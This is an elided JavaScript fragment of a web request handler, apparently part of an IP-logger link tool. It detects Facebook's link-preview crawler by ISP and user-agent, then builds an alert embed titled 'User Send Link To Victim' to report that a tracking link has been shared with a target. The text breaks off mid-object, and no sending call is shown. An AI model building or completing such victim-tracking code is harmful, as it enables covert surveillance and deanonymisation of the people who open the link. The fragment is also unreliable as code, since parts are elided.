...
let facebookSent = false; // Flag to prevent duplicate sends
...
export default async function handler(req, res) {
    if (req.method === 'GET' || req.method === 'POST') {
        ...
        if (ipDetails.hosting) {
            ...
            !facebookSent &&
            ipDetails.isp === "Facebook, Inc." &&
            userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")
        ) {
            facebookSent = true; // Prevent duplicate sends
            message = {
                embeds: [
                    {
                        title: "User Send Link To Victim",
